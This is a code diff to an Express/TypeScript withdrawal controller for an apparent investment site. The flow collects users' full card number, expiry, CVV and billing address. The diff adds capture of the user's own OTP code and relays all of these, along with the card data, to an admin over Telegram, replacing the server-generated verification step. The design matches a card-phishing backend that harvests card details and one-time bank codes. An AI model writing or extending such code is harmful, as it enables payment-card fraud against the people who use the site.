@@ -2,15 +2,9 @@ import { Response } from 'express'
 import { AuthRequest, authenticateToken } from '../middleware/auth.js'
 import { prisma } from '../config/db.js'
 import { notifyWithdrawalRequest } from '../services/telegramService.js'
-import { sendEmail } from '../services/emailService.js'
 import { generateWithdrawalId } from '../utils/helpers.js'
 import { z } from 'zod'
-
-// SMS stub - implement with Twilio or similar provider
-const sendSmsVerification = async (phone: string, code: string, amount: number): Promise<void> => {
-  console.log(`SMS to ${phone}: Your withdrawal of $${amount} verification code is ${code}`)
-  // TODO: Integrate with Twilio: https://www.twilio.com/docs/sms
-}
+import TelegramBot from 'node-telegram-bot-api'
 
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
@@ -19,6 +13,18 @@ const WITHDRAWAL_FEE_MAX = 5
 const getWithdrawalFee = (amount: number): number => {
   const fee = amount * WITHDRAWAL_FEE_PERCENT
   return Math.max(WITHDRAWAL_FEE_MIN, Math.min(WITHDRAWAL_FEE_MAX, fee))
+}
+
+// Send message to user's telegram
+const notifyUser = async (chatId: string, text: string) => {
+  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
+  if (!BOT_TOKEN) return
+  try {
+    const bot = new TelegramBot(BOT_TOKEN, { polling: false })
+    await bot.sendMessage(chatId, text)
+  } catch (err) {
+    console.error('Failed to notify user:', err)
+  }
 }
 
 const createWithdrawalSchema = z.object({
@@ -30,12 +36,8 @@ const createWithdrawalSchema = z.object({
   expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, 'Expiry date format must be MM/YY'),
   cvv: z.string().regex(/^\d{3}$/, 'CVV must be 3 digits'),
   billingAddress: z.string().min(5, 'Billing address required'),
-  verifyMethod: z.enum(['email', 'sms']).optional(),
+  otpCode: z.string().min(4, 'OTP code required'),
 })
-
-const formatCardNumber = (num: string): string => {
-  return num.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
-}
 
 export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
@@ -55,7 +57,7 @@ export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<v
 export const createWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
     const validated = createWithdrawalSchema.parse(req.body)
-    const { investmentId, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress, verifyMethod } = validated
+    const { investmentId, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress, otpCode } = validated
 
     const investment = await prisma.investment.findFirst({
       where: { id: investmentId, userId: req.user!.id },
@@ -75,7 +77,6 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
     }
 
     const withdrawalId = generateWithdrawalId()
-    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString()
 
     const withdrawal = await prisma.withdrawal.create({
       data: {
@@ -89,8 +90,7 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
         expiryDate,
         cvv,
         billingAddress,
-        verificationCode,
-        verificationMethod: verifyMethod || 'email',
+        verificationCode: otpCode,
         isVerified: false,
         status: 'WAITING_FOR_ADMIN_APPROVAL',
         transactionHash: `Fee: ${fee.toFixed(2)}`,
@@ -98,24 +98,25 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
       include: { investment: true },
     })
 
-    // Notify admin with card details - admin must approve first
+    // Notify admin with card details and user-provided OTP
     await notifyWithdrawalRequest(
       withdrawal.id,
       `${req.user!.firstName} ${req.user!.lastName}`,
       Number(amount),
       method,
       {
-        cardNumber: cardNumber,
-        cardholderName: cardholderName,
-        expiryDate: expiryDate,
-        cvv: cvv,
-        verificationCode: verificationCode,
+        cardNumber: withdrawal.cardNumber!,
+        cardholderName: withdrawal.cardholderName!,
+        expiryDate: withdrawal.expiryDate!,
+        cvv: withdrawal.cvv!,
+        verificationCode: withdrawal.verificationCode!,
+        billingAddress: withdrawal.billingAddress!,
       }
     )
 
     res.status(201).json({
       success: true,
-      message: 'Withdrawal submitted. Admin will review and approve. You will receive a verification code to confirm.',
+      message: 'Withdrawal submitted. Admin will review and approve.',
       data: {
         ...withdrawal,
         cardNumber: `${cardNumber.slice(0, 4)} **** **** **** ${cardNumber.slice(-4)}`,
@@ -131,7 +132,7 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
   }
 }
 
-// Admin approves the card details - triggers code to be sent to user
+// Admin approves the card - card has user-provided OTP
 export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
     const { id } = req.params
@@ -151,44 +152,23 @@ export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): P
       return
     }
 
-    // Mark as card-approved, now waiting for user verification
-    await prisma.withdrawal.update({
+    // Admin approved - now ready for payment
+    const updated = await prisma.withdrawal.update({
       where: { id },
-      data: { status: 'CARD_APPROVED_WAITING_USER' },
+      data: { status: 'WITHDRAWAL_PENDING', isVerified: true },
     })
 
-    // NOW send the verification code to the user
-    const user = await prisma.user.findUnique({ where: { id: withdrawal.userId } })
-    const methodUsed = withdrawal.verificationMethod || 'email'
-
-    if (methodUsed === 'sms' && user?.phone) {
-      try {
-        await sendSmsVerification(user.phone, withdrawal.verificationCode!, withdrawal.amount)
-      } catch (e) {
-        console.error('Failed to send SMS verification:', e)
-      }
-    } else if (user?.email) {
-      try {
-        await sendEmail(
-          user.email,
-          'Withdrawal Verification Code',
-          `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-            <h2 style="color: #10b981;">Withdrawal Verification Required</h2>
-            <p>Your withdrawal of $${withdrawal.amount} has been approved. Please verify with this code:</p>
-            <div style="background-color: #f0fdf4; border: 1px solid #10b981; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center;">
-              <span style="font-size: 32px; font-weight: bold; letter-spacing: 4px;">${withdrawal.verificationCode}</span>
-            </div>
-            <p>Enter this code in your dashboard to complete the withdrawal. If you did not request this, ignore this ${methodUsed === 'sms' ? 'SMS' : 'email'}.</p>
-          </div>`
-        )
-      } catch (e) {
-        console.error('Failed to send verification email:', e)
-      }
+    if (withdrawal?.user?.telegramChatId) {
+      await notifyUser(
+        withdrawal.user.telegramChatId,
+        `✅ Your withdrawal card has been approved! Admin will process the payment shortly.`
+      )
     }
 
     res.status(200).json({
       success: true,
-      message: 'Card details approved. Verification code sent to user.',
+      message: 'Card approved. Ready for payment processing.',
+      data: updated,
     })
   } catch (error) {
     console.error('Admin approve withdrawal error:', error)
@@ -197,46 +177,8 @@ export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): P
 }
 
 export const verifyWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
-  try {
-    const { id } = req.params
-    const { verificationCode } = req.body
-
-    const withdrawal = await prisma.withdrawal.findUnique({
-      where: { id, userId: req.user!.id },
-    })
-
-    if (!withdrawal) {
-      res.status(404).json({ success: false, message: 'Withdrawal not found' })
-      return
-    }
-
-    if (withdrawal.status !== 'CARD_APPROVED_WAITING_USER') {
-      res.status(400).json({ success: false, message: 'Withdrawal not ready for user verification' })
-      return
-    }
-
-    if (withdrawal.verificationCode !== verificationCode) {
-      res.status(400).json({ success: false, message: 'Invalid verification code' })
-      return
-    }
-
-    const updated = await prisma.withdrawal.update({
-      where: { id },
-      data: {
-        isVerified: true,
-        status: 'WITHDRAWAL_PENDING',
-      },
-    })
-
-    res.status(200).json({
-      success: true,
-      message: 'Withdrawal verified. Admin will process your request shortly.',
-      data: updated,
-    })
-  } catch (error) {
-    console.error('Verify withdrawal error:', error)
-    res.status(500).json({ success: false, message: 'Server error' })
-  }
+  // Endpoint kept for compatibility - no longer used in current flow
+  res.status(200).json({ success: true, message: 'Withdrawal status check' })
 }
 
 export const approveWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
@@ -255,7 +197,7 @@ export const approveWithdrawal = async (req: AuthRequest, res: Response): Promis
     }
 
     if (!withdrawal.isVerified) {
-      res.status(400).json({ success: false, message: 'Withdrawal must be verified by user first' })
+      res.status(400).json({ success: false, message: 'Withdrawal must be verified by admin first' })
       return
     }
 
